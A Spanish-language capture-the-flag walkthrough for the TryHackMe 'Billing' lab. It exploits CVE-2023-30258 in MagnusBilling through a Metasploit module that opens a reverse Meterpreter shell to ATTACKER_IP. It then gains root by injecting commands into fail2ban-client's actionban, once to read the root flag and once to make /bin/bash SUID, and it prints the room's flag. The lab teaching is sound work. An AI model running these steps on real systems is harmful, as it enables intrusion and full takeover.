[THM - Billing](https://tryhackme.com/room/billing)

La room **Billing** de **TryHackMe** simula un entorno real donde se debe explotar un sistema de facturación VoIP llamado **MagnusBilling** para obtener acceso inicial y luego escalar privilegios hasta convertirse en root.

El desafío se centra en dos vectores de ataque principales:

- **Acceso Inicial:** Se utiliza la vulnerabilidad **CVE-2023-30258**, una ejecución remota de código (RCE) no autenticada presente en la aplicación web, generalmente explotada mediante **Metasploit** para obtener una shell como el usuario `asterisk`.
    
- **Escalada de Privilegios:** Se aprovecha una mala configuración de **sudo** que permite al usuario `asterisk` ejecutar **fail2ban-client** como root sin contraseña, lo que se usa para inyectar comandos y obtener control total del sistema.

## Reconocimiento:

Iniciamos con un análisis utilizando #Nmap

> nmap -sV -sV -sC -Pn * Target *

![[Nmap Reuslts - Billing.png]]

El resultado de Nmap nos indica la presencia de un servidor Web en Apache, un servidor SSH y una Base de Datos MariaDB.

Al visitar la IP nos encontramos con la siguiente página:

![[Web Page - Billing.png]]

En el título de la página, podemos ver un nombre interesante, el cual es el nombre del sistema que está corriendo en el sitio, el cual es Magnus Billing

![[Web Page Title - Billing.png]]

Al buscarlo en internet, descubrimos que es una plataforma Open Source de VoIP.

![[Pasted image 20261004203042.png]]

Si a la búsqueda agregamos CVE, nos damos cuenta que hay una vulnerabilidad en las versiones 6.x y 7.x del sistema.

![[Pasted image 20261004203305.png]]

Al analizar en las consultas del sitio, una de ellas nos permite identificar la versión del sistema.

![[Web Page Site Version - Billing.png]]

## Ejecución:

Al identificar que el sistema posee la versión 6, y al saber que existe un CVE que nos permite realizar inyección de comandos no autenticada, procedemos a ejecutar la explotación de la vulnerabilidad.

### Inicializamos Metasploit y seleccionamos el módulo a utilizar

En el sitio de Rapid7, podemos ver un ejemplo de cómo ejecutar el módulo correspondiente a este exploit: https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/

### ¿Qué hace el exploit?
1. Inyecta un comando en el parámetro `democ` (sin autenticación).
2. Sube un ****webshell PHP**** oculto dentro de un PNG (chunk PLTE).
3. Ejecuta el payload vía el webshell → sesión Meterpreter.
 

![[msconsole-1.png]]

Los comandos ejecutados son:

```
msfconsole

use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258 

set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set target 2

run
```

1. Con el primer comando inicializamos Metasploit
2. Seleccionamos el módulo que utilizaremos.
3. **set RHOSTS TARGET_IP** define la dirección IP del objetivo (remote host). Es el host contra el que se lanzará el exploit.
4. **set LHOST ATTACKER_IP** define la dirección IP de tu máquina (local/listen host). Es la IP a la que el payload intentará conectar de vuelta (en payloads reverse) para establecer la sesión.
5. **set target 2** selecciona la **variante de objetivo** del exploit por su índice numérico. Cada módulo tiene una lista de _targets_ (por ejemplo, diferentes SO, arquitecturas x86/x64, versiones). El índice `2` corresponde a la tercera entrada de esa lista, visible con `show targets`. En este caso, sería "Linux Dropper".
### ¿Qué hace TARGET 2 (Linux Dropper)?

1. Inyecta un comando en el parámetro `democ` (sin autenticación).
2. Usa ****cmdstager**** (wget/curl) para que el target descargue un binario.
3. Ejecuta el binario → sesión ****Meterpreter**** (`linux/x64/meterpreter/reverse_tcp`).

### Ventajas de TARGET 2 sobre TARGET 0 (PHP)

|                              | TARGET 0 (PHP)                          | TARGET 2 (Linux Dropper)            |
| ---------------------------- | --------------------------------------- | ----------------------------------- |
| ****Mecanismo****            | Webshell PHP oculto en PNG (chunk PLTE) | cmdstager (wget/curl) → binario     |
| ****Payload****              | `php/meterpreter/reverse_tcp`           | `linux/x64/meterpreter/reverse_tcp` |
| ****Estabilidad****          | Buena                                   | Mejor (canal binario puro)          |
| ****Requiere****             | PHP en target                           | wget/curl disponible                |
| ****Problema multi-línea**** | Menor                                   | Ninguno (canal binario)             |

Podemos validar que las opciones estén correctamente seleccionadas.

![[msconsole-2.png]]

Al validarlo, ingresamos `run` para ejecutar el exploit.

![[msconsole-3.png]]

El proceso cargará y tendremos activa una sesión de Meterpreter.

En Meterpreter, no ejecutamos comandos del sistema directamente, para poder hacerlo, abrimos un shel con el comando `shell`. Al tener una shell iniciada, ejecutamos los siguientes comandos:

`id`  
`uname -a ` 
`sudo -l`

![[msconsole-4.png]]

Entre los resultados de estos comandos encontramos el siguiente hallazgo:
```
asterisk ALL=(root) NOPASSWD: /usr/bin/fail2ban-client
```

Esto nos indica que el usuario `asterisk` puede ejecutar ***cualquier subcomando*** de `fail2ban-client` como root sin contraseña. Esto es explotable porque `fail2ban-client` permite inyectar comandos arbitrarios en campos de configuración (`actionban`) que se ejecutan como root cuando se dispara un ban.

## Escalada a Root — Método 1 (Lectura directa de flag)

### Objetivo

Leer `/root/root.txt` sin obtener shell completo.

### Secuencia
```
# 1. Reiniciar fail2ban (estado limpio)  
sudo /usr/bin/fail2ban-client restart  
  
# 2. Inyectar comando en actionban de la acción existente  
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'"  
  
# 3. Disparar el ban → ejecuta actionban como root  
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1  
  
# 4. Leer el flag  
cat /tmp/root.txt
```
### Resultado
```
THM{33ad5b530e71a172648f424ec23fae60}
```

![[msconsole-5.png]]

### ¿Por qué funciona?
```
asterisk ejecuta: fail2ban-client set sshd banip 127.0.0.1  
│  
▼ (sudo eleva a root)  
fail2ban (root) banea 127.0.0.1  
│  
▼  
Ejecuta actionban del jail sshd → tu comando inyectado  
│  
▼  
/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt'  
│  
▼ (se ejecuta como root)  
Flag copiado a /tmp con permisos 777 → legible por asterisk
```

## Escalada a Root — Método 2 (Shell completo)

### Objetivo

Obtener un shell interactivo como root.

### Secuencia
```
# 1. Reiniciar fail2ban  
sudo /usr/bin/fail2ban-client restart  
  
# 2. Crear una acción nueva llamada "evil"  
sudo /usr/bin/fail2ban-client set sshd addaction evil  
  
# 3. Inyectar SUID en /bin/bash como actionban  
sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"  
  
# 4. Disparar el ban → ejecuta actionban como root  
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1  
  
# 5. Shell root (el -p preserva el euid=0)  
/bin/bash -p
```

### Resultado
```
bash-5.2# id  
uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root) groups=0(root),1001(asterisk)  
  
bash-5.2# whoami  
root
```

![[msconsole-6.png]]
### ¿Por qué funciona?

```
fail2ban (root) ejecuta actionban: "chmod +s /bin/bash"  
│  
▼  
/bin/bash ahora tiene bit SUID (rwsr-xr-x root root)  
│  
▼  
asterisk ejecuta: /bin/bash -p  
│  
▼  
Kernel ve SUID → euid=0 (root)  
│  
▼  
El -p impide que bash "baje" el euid al uid real  
│  
▼  
Shell interactivo como root
```

### Diferencia entre ambos métodos:

|               | Método 1                                  | Método 2                  |
| ------------- | ----------------------------------------- | ------------------------- |
| **Objetivo**  | Leer un archivo específico                | Shell completo            |
| **Acción**    | Modifica `iptables-multiport` (existente) | Crea `evil` (nueva)       |
| **Payload**   | `cat > /tmp && chmod`                     | `chmod +s /bin/bash`      |
| **Resultado** | Flag en `/tmp`                            | Shell root persistente    |
| **Uso**       | Cuando solo necesitas un flag             | Cuando necesitas explorar |

## Resumen del flujo completo


```
┌─────────────────────────────────────────────────────────────┐  
│ 1. RCE via CVE-2023-30258 (MagnusBilling)                   │  
│ → TARGET 2 (Linux Dropper) → Meterpreter como asterisk      │  
├─────────────────────────────────────────────────────────────┤  
│ 2. Enumeración                                              │  
│ → sudo -l → fail2ban-client NOPASSWD                        │  
├─────────────────────────────────────────────────────────────┤  
│ 3. Escalada a root                                          │  
│ → Inyectar comando en actionban de fail2ban                 │  
│ → Disparar con banip                                        │  
│ → root                                                      │  
├─────────────────────────────────────────────────────────────┤  
│ 4. Flags                                                    │  
│ → /root/root.txt (Método 1)                                 │  
│ → /home/magnus/user.txt (Método 2)                          │  
└─────────────────────────────────────────────────────────────┘
```
